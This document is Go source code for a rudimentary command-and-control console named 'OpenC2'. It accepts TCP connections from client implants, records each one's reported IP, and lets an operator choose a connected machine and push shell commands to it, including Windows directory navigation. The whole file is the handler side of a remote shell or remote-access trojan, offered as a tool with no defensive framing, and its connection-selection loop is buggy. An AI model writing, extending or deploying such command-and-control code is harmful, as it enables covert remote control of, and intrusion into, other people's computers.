package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

const (
	CONN_HOST = "localhost"
	CONN_PORT = "3333"
	CONN_TYPE = "tcp"
)

var sysInfo = make(map[string]net.Conn)

func main() {
	// Listen for incoming connections.
	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	// Close the listener when the application closes.
	defer l.Close()
	fmt.Println("Welcome to OpenC2!\nListening on " + CONN_HOST + ":" + CONN_PORT)
	go userInput()
	for {
		// Listen for an incoming connection.
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		getIP(conn)
		// Handle connections in a new goroutine.
		// go handleRequest(conn)
	}
}

func userInput() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Println("Your available connections are:")
		counter := 1
		for k := range sysInfo {
			fmt.Println(strconv.Itoa(counter) + ". " + k)
			counter++
		}
		fmt.Print("Enter connection number: ")
		str, _ := reader.ReadString('\n')
		str = strings.TrimSpace(str)
		number, _ := strconv.Atoi(str)
		counter = 1
		for _, value := range sysInfo {
			if counter == number {
				handleRequest(value)
			}
		}

	}
}

func handleRequest(conn net.Conn) {

	for {

		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Enter command: ")
		strEcho, _ := reader.ReadString('\n')
		// strEcho := "cd .."
		strip := strings.TrimSpace(strEcho)
		// buf := []byte(strEcho)
		stripSplit := strings.Split(strip, " ")

		if strip == "quit" {
			fmt.Println("bye")
			return
		}

		if strip == "getinfo" {
			fmt.Println(sysInfo)
		}

		if len(stripSplit) > 1 {
			if stripSplit[0] == "cd" {

				path := getdirectory(conn)
				if stripSplit[1] == ".." {
					splitPath := strings.Split(path, "\\")
					newDirectory := ""
					for i := 0; i < len(splitPath)-1; i++ {
						newDirectory += splitPath[i] + "\\"
					}
					strEcho = "cd " + newDirectory
					path = newDirectory
				} else {
					strEcho = "cd " + path + "\\" + stripSplit[1]
					path += "\\" + stripSplit[1]
				}
			}
		}

		communicate(conn, strEcho)
		// conn.Close()
	}

}

func communicate(conn net.Conn, strEcho string) {
	_, err := conn.Write([]byte(strEcho))
	if err != nil {
		println("Write to server failed:", err.Error())
	}

	println("write to server =", strEcho)

	reply := make([]byte, 8192)

	_, err = conn.Read(reply)
	if err != nil {
		println("no result output", err.Error())
	}

	println("reply from server=", string(reply))
}

func getIP(conn net.Conn) {
	_, err := conn.Write([]byte("gimme"))
	if err != nil {
		println("Write to server failed:", err.Error())
	}

	reply := make([]byte, 8192)

	_, err = conn.Read(reply)
	if err != nil {
		println("no result output", err.Error())
	}
	ipString := string(reply)
	ipString = strings.TrimSpace(ipString)
	sysInfo[ipString] = conn
}

func getdirectory(conn net.Conn) string {
	_, err := conn.Write([]byte("whereami"))
	if err != nil {
		println("Write to server failed:", err.Error())
	}

	reply := make([]byte, 8192)

	_, err = conn.Read(reply)
	if err != nil {
		println("no result output", err.Error())
	}
	directory := ""
	for _, v := range reply {
		if v != 0 {
			directory = directory + string(v)
		}
	}
	return directory
}
